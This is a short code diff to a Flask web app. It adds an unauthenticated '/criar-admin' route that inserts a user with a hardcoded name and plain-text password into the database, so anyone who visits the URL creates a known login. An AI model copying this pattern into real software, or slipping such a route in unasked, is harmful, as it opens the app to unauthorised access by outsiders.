@@ -46,6 +46,16 @@ def home():
     logado = "usuario" in session
     return render_template("index.html", atividades=atividades, logado=logado)
 
+@app.route("/criar-admin")
+def criar_admin():
+    conn, cursor = get_db()
+    cursor.execute(
+        "INSERT INTO users (usuario, senha) VALUES (?, ?)",
+        ("Deadlife", "67889")
+    )
+    conn.commit()
+    conn.close()
+    return "Usuário criado."
 
 @app.route("/login", methods=["POST"])
 def logar():
